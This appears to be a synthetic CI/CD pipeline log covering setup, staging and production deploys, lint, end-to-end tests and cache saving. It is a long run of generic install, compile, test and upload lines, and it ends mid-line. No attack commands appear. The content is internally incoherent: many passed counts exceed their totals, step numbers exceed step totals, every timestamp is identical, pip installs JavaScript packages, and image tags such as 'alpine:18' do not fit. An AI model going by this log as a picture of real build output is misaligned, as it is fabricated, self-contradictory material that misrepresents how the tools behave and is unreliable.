Collecting axios\nCache miss for key-3853\nInstalling eslint@3.4.7\nTLS handshake completed\nProcessing...\nBuilding Docker image...\nFetching from https://pypi.org/package.json\nWARNING: react has known vulnerabilities\nBundling vendor.css\nAlready up to date.\n[12:47:57] INFO: Starting build process\nWaiting...\nPlatform: linux-x64\nStep 14/16: Running migrations\nOptimizing 75 modules...\nFetching from https://pypi.org/package.json\nBundling styles.css\n[12:47:57] INFO: Processing request\npip install: Successfully installed prettier-3.10\nOptimizing 52 modules...\n[12:47:57] ERROR: Connection failed\npip: Downloading jest-2.9.tar.gz\nCompiling components/index.js...\nCompleted.\nCache miss for key-4104\n[12:47:57] INFO: Connecting to database\nArtifact uploaded: dist.zip (99MB)\nChecking out develop branch\n\u2713 Step 'build' succeeded\nOK\nGET /status - 200 (94ms)\npip install: Successfully installed lodash-1.4\nTLS handshake completed\nReady.\nBundling styles.css\nnpm install: added 133 packages\nSnapshots: 43 passed, 4 total\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\n[12:47:57] INFO: Request completed\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nBuilding Docker image...\nArtifact uploaded: dist.zip (19MB)\nUsing Node.js 17.12.3\nArtifact uploaded: dist.zip (79MB)\nCompiling utils/utils.go...\nnpm install: resolved 1793 packages\n[12:47:57] INFO: Processing request\nyarn add: Done in 29.34s\nnpm notice: package.json updated\n  PASS: integration/test_user_create.spec.js\nConnection established\n\u2713 lint completed\nOptimizing 28 modules...\nMinifying app.js\n\u2713 lint completed\nCompiling components/utils.go...\nNODE_ENV=test\nSnapshots: 0 passed, 9 total\nArtifact uploaded: build.tar.gz (19MB)\nGenerating source maps...\nChecking out develop branch\nnpm install: resolved 1842 packages\nPOST /upload - 201 (222ms)\nFetching from https://gcr.io/package.json\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'checkout' succeeded\n  PASS: test_user_create (404ms)\nTests: 82 passed, 293 total\nArtifact downloaded: 7MB\nFinished.\nStep 19/15: Building\nTLS handshake completed\n\u2713 Step 'test' succeeded\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\nFetching from https://googleapis.com/package.json\nSwitched to branch 'bugfix/task-688'\nAlready up to date.\n[12:47:57] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nConnection established\nReady.\n\u2713 Task completed in 1251ms\npip: Installing build dependencies...\nFinished.\nCompiling components/index.js...\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 241 packages\nAlready up to date.\npip: Installing build dependencies...\nTest Suites: 12 passed, 48 total\nFetching from https://docker.io/package.json\nFinished.\nSuccess!\nGenerating source maps...\npip install: Successfully installed prettier-3.16\nVerifying...\nStep 8/23: Testing\nInstalling lodash@3.8.6\nCompiling lib/app.ts...\nArtifact downloaded: 20MB\nArtifact uploaded: dist.zip (82MB)\npip install: Successfully installed axios-1.5\nFinished.\n[12:47:57] DEBUG: Connection pool: 7 active\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nCache hit for key-4332\nInstalling react@5.15.6\nFAILED: test_auth_login\n[12:47:57] ERROR: Connection failed\n  PASS: test_auth_login (201ms)\nChecking out master branch\nChecking out develop branch\nUsing Node.js 20.3.7\nArtifact uploaded: build.tar.gz (38MB)\nLoading...\n\u2717 build failed with exit code 98\nPulling image: node:latest\nGenerating source maps...\n[12:47:57] DEBUG: Connection pool: 3 active\nStep 3/21: Building\nCreating production build...\nWARNING: lodash has known vulnerabilities\npip: Installing build dependencies...\npip install: Successfully installed axios-2.5\n\u2713 Task completed in 838ms\nArtifact downloaded: 6MB\npip: Downloading express-2.6.tar.gz\nPlatform: darwin-arm64\nGenerating source maps...\nPulling image: python:latest\nArtifact downloaded: 40MB\nLayer 1/14: RUN command\nArtifact uploaded: build.tar.gz (16MB)\nException: NullPointerException\nSwitched to branch 'hotfix/task-950'\nFinished.\n[12:47:57] DEBUG: Query executed in 84ms\nTLS handshake completed\nUploading artifact 'coverage' (39 files)\npip install: Successfully installed lodash-5.14\nUsing Node.js 20.0.9\n\u2713 Task completed in 2259ms\nStep 10/22: Installing dependencies\nNODE_ENV=production\nAlready up to date.\npip: Installing build dependencies...\nCompiling components/handler.rs...\nWARNING: prettier has known vulnerabilities\nyarn add: Done in 29.67s\nCache hit for key-5293\nTransforming 579 files...\n\u2717 build failed with exit code 49\nOptimizing 35 modules...\n[12:47:57] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCompiling src/handler.rs...\nCompleted.\nCache restored successfully (43MB)\nWARNING: axios has known vulnerabilities\nNODE_ENV=production\nCoverage: 95% statements, 97% branches\n\u2713 build completed\nUsing Python 3.9\n  PASS: test_user_create (79ms)\nEnvironment: test\npip: Collecting prettier\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nStep 8/22: Testing\n\u2713 Step 'install' succeeded\nPlatform: darwin-arm64\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 10/18: Running migrations\nHEAD is now at 12b2b84\nnpm install: resolved 1347 packages\n[12:47:57] INFO: Connecting to database\n[12:47:57] INFO: Processing request\nCache restored successfully (460MB)\nTransforming 341 files...\nStep 1/17: Running migrations\nConnection established\nHEAD is now at 7f25365\nWARNING: jest has known vulnerabilities\nNODE_ENV=test\n[12:47:57] WARN: Deprecated API usage\nnpm notice: package.json updated\nGenerating source maps...\nFetching from https://github.com/package.json\nVerifying...\nStep 17/18: Linting\n  PASS: integration/test_api_health.spec.js\nInstalling axios@5.5.4\nImage pulled successfully\nyarn add: Done in 1.12s\nFetching submodules...\nPulling image: alpine:3.11\nStep 17/17: Linting\nArtifact uploaded: dist.zip (33MB)\nnpm install: resolved 551 packages\n[12:47:57] INFO: Request completed\n[12:47:57] INFO: Connecting to database\n[12:47:57] WARN: Deprecated API usage\nTime: 117.181s\nAlready up to date.\nProcessing...\n[12:47:57] DEBUG: Query executed in 78ms\n\u2713 Task completed in 2887ms\nPlatform: darwin-arm64\nPulling image: alpine:18\nEnvironment: development\n[12:47:57] WARN: Deprecated API usage\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (45MB)\nSuccess!\nTest Suites: 27 passed, 20 total\nSnapshots: 1 passed, 33 total\npip: Installing build dependencies...\nException: RuntimeError\nGET /health - 201 (44ms)\nnpm notice: created a lockfile\nOptimizing 60 modules...\nyarn add: Done in 12.26s\nCache saved successfully\n[12:47:57] WARN: Deprecated API usage\nDone.\nPOST /upload - 202 (324ms)\nFetching submodules...\nRan 116 tests in 2s\n[12:47:57] INFO: Processing request\nPushing to registry...\nBundling styles.js\nWaiting...\nSuccess!\nCompleted.\n[12:47:57] INFO: Cache refreshed\nCompiling utils/app.ts...\n\u2713 Task completed in 544ms\n  PASS: e2e/test_db_connect.spec.js\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\n[12:47:57] DEBUG: Initializing service\nPlatform: win32-x64\nAlready up to date.\n[12:47:57] DEBUG: Query executed in 78ms\nCache hit for key-4643\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-5908\nGET /status - 201 (2ms)\nSnapshots: 6 passed, 35 total\nSuccess!\nNODE_ENV=development\nFinished.\n[12:47:57] DEBUG: Initializing service\nArtifact uploaded: dist.zip (58MB)\n  PASS: test_db_connect (72ms)\nPulling image: node:18\nCompiling utils/service.java...\nGET /health - 200 (19ms)\npip: Downloading prettier-5.20.tar.gz\nPlatform: win32-x64\nTransforming 152 files...\n  PASS: test_user_create (417ms)\nUsing Python 3.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 87 modules...\nCreating production build...\nNODE_ENV=production\nStep 3/18: Running migrations\n[12:47:57] WARN: Deprecated API usage\n  PASS: test_user_create (196ms)\nSuccess!\npip: Installing build dependencies...\nBuilding Docker image...\nPlatform: win32-x64\nFetching from https://npmjs.org/package.json\nSnapshots: 32 passed, 4 total\nWaiting...\nArtifact uploaded: dist.zip (32MB)\nnpm notice: created a lockfile\nProcessing...\nCache miss for key-6497\nCompiling src/app.ts...\nProcessing...\n[12:47:57] INFO: Connecting to database\nWaiting...\npip: Downloading prettier-5.5.tar.gz\n[12:47:57] DEBUG: Connection pool: 1 active\nCache saved successfully\n[12:47:57] INFO: Cache refreshed\n\u2713 package completed\nLoading...\nPOST /api - 201 (62ms)\nGenerating source maps...\npip: Installing build dependencies...\nStep 19/24: Building\nStep 17/25: Building\n[12:47:57] INFO: Processing request\nWaiting...\nCompiling lib/handler.rs...\nCompiling src/service.java...\nTests: 436 passed, 472 total\nInstalling react@4.12.7\nMinifying app.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\nFetching from https://pypi.org/package.json\nPushing to registry...\nCache saved successfully\nArtifact uploaded: build.tar.gz (26MB)\nUsing Node.js 14.12.1\nFetching submodules...\nTransforming 108 files...\nCreating production build...\nStep 1/21: Deploying\nnpm install: resolved 959 packages\nNODE_ENV=development\nnpm notice: package.json updated\nCompleted.\nTime: 61.386s\nPlatform: win32-x64\nHEAD is now at c4476ab\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 3912ms\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Request completed\nPushing to registry...\nArtifact uploaded: build.tar.gz (6MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 9/14: RUN command\nFinished.\nyarn add: Done in 29.92s\npip: Downloading express-4.18.tar.gz\nnpm install: resolved 1254 packages\npip: Installing build dependencies...\nPlatform: win32-x64\nEnvironment: test\npip: Downloading lodash-1.17.tar.gz\nTests: 236 passed, 83 total\nBundling vendor.js\nLoading...\nGenerating source maps...\nStep 12/18: Running migrations\nStep 5/22: Deploying\nOK\nnpm install: added 326 packages\nVerifying...\nUsing Python 3.9\n[12:47:57] INFO: Processing request\nnpm notice: package.json updated\nRan 172 tests in 19s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\n\u2717 build failed with exit code 74\n\u2717 build failed with exit code 127\nnpm notice: package.json updated\nStep 19/22: Running migrations\nnpm notice: created a lockfile\nStep 3/22: Installing dependencies\nReady.\nArtifact uploaded: dist.zip (7MB)\nPOST /data - 201 (461ms)\n[12:47:57] INFO: Cache refreshed\nArtifact downloaded: 37MB\nTest Suites: 37 passed, 41 total\nTests: 494 passed, 161 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 13/20: Installing dependencies\n[12:47:57] WARN: Deprecated API usage\nCompiling src/main.py...\nCoverage: 90% statements, 60% branches\n\u2713 Step 'install' succeeded\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:57] DEBUG: Memory usage: 1459MB\nMinifying vendor.js\nFinished.\nWaiting...\nSuccess!\n[12:47:57] DEBUG: Connection pool: 6 active\nCompiling components/app.ts...\nCompiling utils/utils.go...\nStep 17/19: Installing dependencies\n[12:47:57] DEBUG: Query executed in 83ms\n[12:47:57] DEBUG: Memory usage: 534MB\n\u2713 All checks passed\nCache invalidated: build\nCreating production build...\nnpm install: added 457 packages\nRan 158 tests in 51s\nNODE_ENV=production\nTime: 116.315s\nFAILED: test_api_health\nImage pulled successfully\nCoverage: 90% statements, 71% branches\nnpm notice: package.json updated\n\u2713 Task completed in 522ms\nStep 17/23: Deploying\nPlatform: win32-x64\nGET /status - 201 (76ms)\n\u2713 All checks passed\nOptimizing 56 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:57] INFO: Connecting to database\nDone.\n\u2713 validate completed\nLoading...\n[12:47:57] WARN: Deprecated API usage\nCompiling lib/app.ts...\nCache saved successfully\nLayer 1/14: RUN command\nUsing Python 3.12\nStep 8/21: Linting\nTest Suites: 15 passed, 9 total\nStep 8/21: Deploying\nCompiling components/main.py...\n  PASS: e2e/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:57] INFO: Processing request\nLayer 10/14: COPY command\nNODE_ENV=test\nCache miss for key-8132\nCreating production build...\nStep 2/20: Testing\nHEAD is now at 801372d\n[12:47:57] INFO: Cache refreshed\nTest Suites: 48 passed, 7 total\nStep 14/24: Linting\nStep 9/24: Linting\n[12:47:57] DEBUG: Memory usage: 1162MB\npip: Installing build dependencies...\nHEAD is now at 875879d\nSuccess!\nUsing Python 3.10\nProcessing...\nArtifact uploaded: dist.zip (51MB)\nStep 3/16: Running migrations\nCache restored successfully (345MB)\nCache saved successfully\n\u2713 Step 'checkout' succeeded\nStep 2/25: Linting\n[12:47:57] WARN: Deprecated API usage\n\u2713 Step 'test' succeeded\n[12:47:57] INFO: Processing request\nStep 15/24: Installing dependencies\nLoading...\nCompiling utils/index.js...\nTest Suites: 38 passed, 12 total\n=== Step deploy_staging completed ===\n=== Step: lint ===\nUploading artifact 'dist' (42 files)\nProcessing...\nFinished.\nOptimizing 28 modules...\nTests: 435 passed, 86 total\nTest Suites: 6 passed, 39 total\nSuccess!\n\u2717 build failed with exit code 33\nSuccess!\nSuccess!\nCompleted.\nGET /status - 200 (66ms)\nCreating production build...\nCache invalidated: node_modules\nFAILED: test_api_health\nnpm notice: created a lockfile\npip: Collecting express\n[12:47:57] INFO: Processing request\nChecking out main branch\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Processing request\nStep 15/22: Building\nTests: 165 passed, 384 total\nReady.\n[12:47:57] DEBUG: Initializing service\npip install: Successfully installed eslint-4.10\nStep 18/15: Running migrations\nCache saved successfully\n[12:47:57] DEBUG: Initializing service\nSuccess!\nCache miss for key-5488\n[12:47:57] DEBUG: Query executed in 81ms\n[12:47:57] DEBUG: Query executed in 49ms\nGenerating source maps...\n[12:47:57] INFO: Cache refreshed\nGET /status - 201 (33ms)\nTime: 4.603s\nnpm notice: created a lockfile\nProcessing...\npip install: Successfully installed lodash-4.19\nCache miss for key-6155\nWARNING: react has known vulnerabilities\nnpm install: added 110 packages\n[12:47:57] DEBUG: Loading configuration\nCompiling lib/handler.rs...\nStep 4/24: Testing\n[12:47:57] DEBUG: Initializing service\nLayer 5/9: ENV command\nStep 20/24: Testing\nFinished.\nUsing Python 3.9\nFetching submodules...\nDone.\nGET /api - 204 (52ms)\nStep 9/25: Linting\nLoading...\nGenerating source maps...\nConnection established\nOK\n\u2713 deploy completed\nReady.\nEnvironment: staging\nCompiling src/handler.rs...\nImage pulled successfully\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] DEBUG: Query executed in 42ms\npip install: Successfully installed webpack-3.4\nTLS handshake completed\nTests: 448 passed, 403 total\nCache hit for key-7553\nLayer 2/12: RUN command\nWARNING: jest has known vulnerabilities\nImage pulled successfully\n[12:47:57] DEBUG: Connection pool: 5 active\n[12:47:57] DEBUG: Connection pool: 15 active\nWARNING: jest has known vulnerabilities\nCreating production build...\nWaiting...\nCoverage: 83% statements, 61% branches\nOptimizing 15 modules...\nSnapshots: 26 passed, 39 total\n[12:47:57] DEBUG: Initializing service\npip: Installing build dependencies...\nPushing to registry...\nUsing Node.js 15.17.0\n[12:47:57] ERROR: Connection failed\nTest Suites: 27 passed, 9 total\nWaiting...\n[12:47:57] INFO: Starting build process\nFinished.\n\u2713 Task completed in 267ms\n[12:47:57] INFO: Cache refreshed\nCache miss for key-8954\n\u2713 Step 'install' succeeded\nPOST /data - 202 (73ms)\nyarn add: Done in 10.55s\nNODE_ENV=test\nTime: 97.870s\nRan 78 tests in 10s\nWARNING: axios has known vulnerabilities\nnpm notice: package.json updated\nTLS handshake completed\nWARNING: prettier has known vulnerabilities\nSwitched to branch 'hotfix/task-965'\nCompiling utils/service.java...\nCompiling lib/main.py...\nWARNING: axios has known vulnerabilities\nMinifying main.js\nCache miss for key-2560\nProcessing...\nGET /status - 204 (21ms)\nnpm install: resolved 1563 packages\nBundling runtime.js\nBuilding Docker image...\nLayer 6/10: COPY command\nSuccess!\nTransforming 190 files...\nCreating production build...\n\u2713 All checks passed\nVerifying...\n  PASS: e2e/test_db_connect.spec.js\n\u2713 validate completed\nStep 14/23: Linting\nWARNING: webpack has known vulnerabilities\nCache restored successfully (271MB)\nTest Suites: 42 passed, 44 total\nTLS handshake completed\nTransforming 676 files...\n  PASS: e2e/test_api_health.spec.js\nDone.\n\u2713 validate completed\nMinifying app.js\n[12:47:57] DEBUG: Query executed in 52ms\nFinished.\npip: Installing build dependencies...\n\u2713 Step 'test' succeeded\n[12:47:57] INFO: Cache refreshed\nTime: 112.714s\nLoading...\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 18/19: Testing\n[12:47:57] WARN: Deprecated API usage\nCoverage: 72% statements, 83% branches\n\u2713 Step 'setup' succeeded\nCompleted.\nStep 12/20: Running migrations\nHEAD is now at 2f0e32d\nCache miss for key-1162\nPOST /data - 202 (319ms)\nChecking out main branch\n[12:47:57] DEBUG: Connection pool: 14 active\nCompiling lib/index.js...\nCoverage: 91% statements, 62% branches\nStep 16/24: Running migrations\nCompiling utils/index.js...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nNODE_ENV=production\nnpm notice: created a lockfile\n\u2713 Step 'setup' succeeded\nUsing Node.js 15.2.1\n\u2713 Task completed in 3163ms\nTLS handshake completed\nSwitched to branch 'bugfix/task-169'\nTest Suites: 50 passed, 34 total\nRan 131 tests in 45s\nMinifying app.js\nConnection established\n[12:47:57] DEBUG: Connection pool: 14 active\nnpm notice: created a lockfile\n  PASS: unit/test_user_create.spec.js\nConnection established\nStep 19/19: Linting\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: eslint has known vulnerabilities\nStep 13/24: Testing\nUsing Python 3.11\nNODE_ENV=test\nFAILED: test_db_connect\npip: Installing build dependencies...\nSnapshots: 28 passed, 31 total\nException: ValueError\n[12:47:57] DEBUG: Initializing service\nMinifying app.js\nOptimizing 23 modules...\n[12:47:57] DEBUG: Query executed in 54ms\nyarn add: Done in 22.3s\nnpm install: added 47 packages\nHEAD is now at 22d8831\nTransforming 944 files...\nCompiling components/index.js...\nWARNING: eslint has known vulnerabilities\nNODE_ENV=development\nCompiling src/utils.go...\n\u2713 All checks passed\nLayer 3/8: ENV command\nTests: 241 passed, 269 total\nBuilding Docker image...\nTest Suites: 42 passed, 24 total\nyarn add: Done in 4.87s\n  PASS: integration/test_db_connect.spec.js\nSuccess!\n[12:47:57] INFO: Request completed\nCache restored successfully (116MB)\nnpm notice: created a lockfile\nCompiling lib/service.java...\nBundling runtime.js\n=== Step lint completed ===\n=== Step: e2e_tests ===\n\u2713 Task completed in 971ms\nnpm install: added 406 packages\nCompiling src/handler.rs...\nCompiling lib/index.js...\n[12:47:57] INFO: Request completed\n[12:47:57] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\n  PASS: test_db_connect (138ms)\nGenerating source maps...\n[12:47:57] DEBUG: Connection pool: 16 active\n  PASS: test_user_create (305ms)\n[12:47:57] DEBUG: Connection pool: 4 active\nReady.\npip install: Successfully installed axios-5.17\n[12:47:57] DEBUG: Query executed in 58ms\nWARNING: express has known vulnerabilities\nFetching submodules...\npip install: Successfully installed eslint-1.6\nFetching from https://github.com/package.json\n\u2713 deploy completed\nLayer 5/15: COPY command\nCompleted.\nProcessing...\nSnapshots: 14 passed, 49 total\nStep 20/17: Testing\nGET /status - 204 (66ms)\n\u2713 Task completed in 4375ms\nUsing Node.js 18.17.3\nCoverage: 83% statements, 62% branches\n[12:47:57] INFO: Cache refreshed\nTest Suites: 24 passed, 5 total\nChecking out develop branch\nMinifying main.js\nFinished.\n\u2713 Task completed in 3405ms\nCompleted.\nStep 2/23: Running migrations\nOK\nFetching from https://githubusercontent.com/package.json\nSuccess!\n[12:47:57] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (27MB)\nFetching from https://npmjs.org/package.json\n[12:47:57] INFO: Starting build process\nPOST /upload - 200 (384ms)\nTLS handshake completed\nCompleted.\nPlatform: linux-x64\nGET /api - 200 (26ms)\nStep 3/25: Installing dependencies\nStep 2/16: Running migrations\nCompiling utils/service.java...\nSwitched to branch 'hotfix/task-230'\nImage pulled successfully\nStep 20/22: Linting\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nLayer 7/14: ENV command\npip: Installing build dependencies...\n\u2713 All checks passed\n[12:47:57] INFO: Processing request\nCompleted.\nPOST /data - 200 (291ms)\nAlready up to date.\n[12:47:57] INFO: Starting build process\nCache saved successfully\nStep 8/15: Running migrations\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] DEBUG: Memory usage: 880MB\nConnection established\n[12:47:57] INFO: Connecting to database\nFetching from https://googleapis.com/package.json\nNODE_ENV=production\nCompiling lib/index.js...\nWARNING: webpack has known vulnerabilities\npip: Downloading eslint-2.9.tar.gz\nGET /status - 201 (41ms)\nTLS handshake completed\nUsing Python 3.9\n[12:47:57] DEBUG: Connection pool: 10 active\nWARNING: prettier has known vulnerabilities\nStep 4/17: Installing dependencies\nLoading...\nReady.\nTLS handshake completed\nSuccess!\nArtifact uploaded: build.tar.gz (2MB)\nInstalling react@4.2.5\nCompiling src/main.py...\n[12:47:57] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed lodash-5.20\n[12:47:57] DEBUG: Connection pool: 2 active\nSnapshots: 7 passed, 6 total\nPulling image: alpine:latest\n[12:47:57] WARN: Deprecated API usage\nFetching submodules...\nCompleted.\n\u2713 Task completed in 2882ms\nTime: 84.37s\nGenerating source maps...\nCache saved successfully\nTime: 16.405s\nStep 13/25: Building\nArtifact uploaded: dist.zip (35MB)\nStep 1/16: Testing\nConnection established\nFetching submodules...\nUsing Node.js 17.11.7\n  PASS: e2e/test_db_connect.spec.js\nStep 5/24: Running migrations\nPulling image: python:latest\nSuccess!\nnpm install: resolved 942 packages\nCompiling components/handler.rs...\nUsing Python 3.12\n[12:47:57] WARN: Deprecated API usage\nCoverage: 90% statements, 77% branches\n[12:47:57] DEBUG: Connection pool: 15 active\nTests: 89 passed, 112 total\nVerifying...\n[12:47:57] DEBUG: Query executed in 22ms\nUploading artifact 'dist' (40 files)\nChecking out develop branch\nStep 11/24: Installing dependencies\nReady.\nStep 11/23: Running migrations\nLoading...\npip install: Successfully installed react-4.7\n\u2713 Step 'checkout' succeeded\nUploading artifact 'coverage' (31 files)\nCache hit for key-3042\nPOST /data - 201 (323ms)\nTest Suites: 13 passed, 17 total\n[12:47:57] INFO: Request completed\nInstalling lodash@2.9.0\nConnection established\n[12:47:57] INFO: Connecting to database\nTLS handshake completed\nArtifact uploaded: build.tar.gz (14MB)\n[12:47:57] INFO: Connecting to database\n  PASS: test_api_health (234ms)\nProcessing...\n[12:47:57] WARN: Deprecated API usage\nArtifact downloaded: 11MB\nyarn add: Done in 8.15s\nMinifying app.js\n[12:47:57] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-278'\nStep 16/23: Deploying\nUsing Python 3.9\nFinished.\n[12:47:57] DEBUG: Initializing service\nCompiling lib/index.js...\nLoading...\npip: Downloading webpack-1.17.tar.gz\nWARNING: express has known vulnerabilities\nTransforming 251 files...\nUsing Python 3.12\nCache miss for key-8981\n[12:47:57] WARN: Deprecated API usage\nWaiting...\nTest Suites: 19 passed, 38 total\nMinifying main.js\nTLS handshake completed\nSnapshots: 32 passed, 38 total\nReady.\nArtifact uploaded: build.tar.gz (48MB)\nFinished.\nPlatform: linux-x64\nLayer 1/15: RUN command\nSnapshots: 1 passed, 11 total\nArtifact uploaded: dist.zip (43MB)\nnpm install: added 289 packages\nVerifying...\npip: Collecting webpack\nGenerating source maps...\nCompleted.\nCompleted.\n[12:47:57] DEBUG: Memory usage: 755MB\n[12:47:57] INFO: Connecting to database\n[12:47:57] WARN: Deprecated API usage\nStep 9/22: Testing\n[12:47:57] DEBUG: Query executed in 78ms\nCompiling lib/main.py...\nWARNING: react has known vulnerabilities\nUsing Python 3.11\nCache saved successfully\nLayer 7/15: RUN command\n[12:47:57] INFO: Cache refreshed\nDone.\nImage pulled successfully\n[12:47:57] ERROR: Connection failed\nCache saved successfully\nTLS handshake completed\nPulling image: python:3.11\nInstalling lodash@4.9.4\nBundling styles.css\nTLS handshake completed\nBuilding Docker image...\nTest Suites: 45 passed, 7 total\nCompiling src/app.ts...\n[12:47:57] INFO: Cache refreshed\nFinished.\nCoverage: 81% statements, 76% branches\nCoverage: 94% statements, 68% branches\nWARNING: express has known vulnerabilities\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nVerifying...\nArtifact uploaded: dist.zip (8MB)\nStep 19/17: Building\nCompiling lib/app.ts...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: darwin-arm64\nChecking out master branch\nnpm install: added 88 packages\nStep 7/22: Installing dependencies\n\u2713 Task completed in 3279ms\nSnapshots: 7 passed, 7 total\nTransforming 588 files...\nAlready up to date.\nStep 12/23: Linting\nStep 20/17: Running migrations\nnpm install: added 79 packages\nUploading artifact 'coverage' (27 files)\nVerifying...\nOptimizing 36 modules...\nGET /health - 200 (47ms)\nSuccess!\nnpm install: added 54 packages\nPlatform: darwin-arm64\nWARNING: webpack has known vulnerabilities\n[12:47:57] INFO: Connecting to database\nException: ValueError\n[12:47:57] DEBUG: Loading configuration\nLayer 1/14: ENV command\nDone.\nFAILED: test_cache_hit\nStep 15/16: Deploying\n[12:47:57] ERROR: Connection failed\n  PASS: test_db_connect (199ms)\nLoading...\nFetching submodules...\n\u2713 All checks passed\n[12:47:57] WARN: Deprecated API usage\nProcessing...\nArtifact downloaded: 24MB\nGenerating source maps...\nUploading artifact 'coverage' (7 files)\nProcessing...\nCompiling lib/app.ts...\n\u2717 build failed with exit code 67\n[12:47:57] DEBUG: Connection pool: 16 active\n\u2713 All checks passed\nGenerating source maps...\nNODE_ENV=test\nStep 13/24: Building\n[12:47:57] DEBUG: Memory usage: 1386MB\n[12:47:57] DEBUG: Memory usage: 199MB\n  PASS: e2e/test_cache_hit.spec.js\nPulling image: node:18\nGET /status - 200 (92ms)\n[12:47:57] DEBUG: Connection pool: 3 active\nGenerating source maps...\nCache miss for key-7809\nReady.\nCompiling components/app.ts...\nBuilding Docker image...\nArtifact uploaded: dist.zip (94MB)\nSnapshots: 40 passed, 17 total\n  PASS: test_auth_login (125ms)\nPlatform: linux-x64\nGenerating source maps...\nPushing to registry...\nnpm install: resolved 540 packages\nFetching from https://pypi.org/package.json\n[12:47:57] INFO: Processing request\n\u2717 build failed with exit code 66\n[12:47:57] DEBUG: Loading configuration\n\u2713 build completed\nMinifying main.js\nStep 4/19: Testing\n\u2713 test completed\nStep 10/24: Linting\nSnapshots: 50 passed, 41 total\nArtifact uploaded: build.tar.gz (6MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nGET /status - 204 (73ms)\nCoverage: 83% statements, 65% branches\n[12:47:57] WARN: Deprecated API usage\n[12:47:57] INFO: Cache refreshed\nUploading artifact 'build' (43 files)\nTest Suites: 7 passed, 33 total\nException: RuntimeError\nCache saved successfully\nUsing Python 3.11\nUsing Node.js 17.20.5\nStep 20/21: Running migrations\nCompiling lib/service.java...\nLoading...\n  PASS: test_user_create (289ms)\nEnvironment: staging\nTLS handshake completed\nFetching from https://githubusercontent.com/package.json\nReady.\nPulling image: node:3.11\nPulling image: alpine:latest\nFetching from https://github.com/package.json\nCreating production build...\nStep 20/23: Deploying\n[12:47:57] ERROR: Connection failed\npip: Downloading eslint-1.1.tar.gz\n  PASS: test_api_health (72ms)\nNODE_ENV=production\n\u2713 deploy completed\nnpm install: added 332 packages\nLayer 1/9: COPY command\n[12:47:57] WARN: Deprecated API usage\nCache invalidated: node_modules\nChecking out master branch\nChecking out develop branch\nyarn add: Done in 14.31s\nGenerating source maps...\n[12:47:57] INFO: Cache refreshed\nTransforming 910 files...\n[12:47:57] INFO: Connecting to database\n[12:47:57] INFO: Starting build process\nStep 14/17: Installing dependencies\nnpm notice: created a lockfile\nCompleted.\n[12:47:57] DEBUG: Connection pool: 7 active\nTLS handshake completed\nStep 15/23: Installing dependencies\nProcessing...\nChecking out develop branch\nUsing Python 3.12\nEnvironment: development\n  PASS: unit/test_user_create.spec.js\nSnapshots: 26 passed, 47 total\n[12:47:57] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nCompleted.\nStep 10/25: Linting\nPushing to registry...\nWARNING: jest has known vulnerabilities\nConnection established\nStep 20/24: Linting\nTLS handshake completed\nException: TypeError\n[12:47:57] INFO: Cache refreshed\nConnection established\nUsing Python 3.9\n  PASS: test_auth_login (31ms)\nFAILED: test_user_create\nOK\nConnection established\n  PASS: e2e/test_cache_hit.spec.js\nWaiting...\nCompiling lib/utils.go...\nCompiling utils/main.py...\nPlatform: linux-x64\nHEAD is now at 0676a19\nTransforming 379 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 138 packages\nProcessing...\nTest Suites: 23 passed, 26 total\nnpm install: added 157 packages\nCache hit for key-4199\n[12:47:57] WARN: Deprecated API usage\nFAILED: test_user_create\nSnapshots: 33 passed, 39 total\n\u2713 All checks passed\nOptimizing 80 modules...\nStep 15/23: Deploying\nArtifact uploaded: build.tar.gz (32MB)\nWaiting...\nUploading artifact 'build' (37 files)\nOK\nCompiling lib/handler.rs...\n[12:47:57] INFO: Connecting to database\nPOST /data - 201 (206ms)\nWaiting...\n\u2717 build failed with exit code 60\npip: Installing build dependencies...\n[12:47:57] INFO: Starting build process\n[12:47:57] 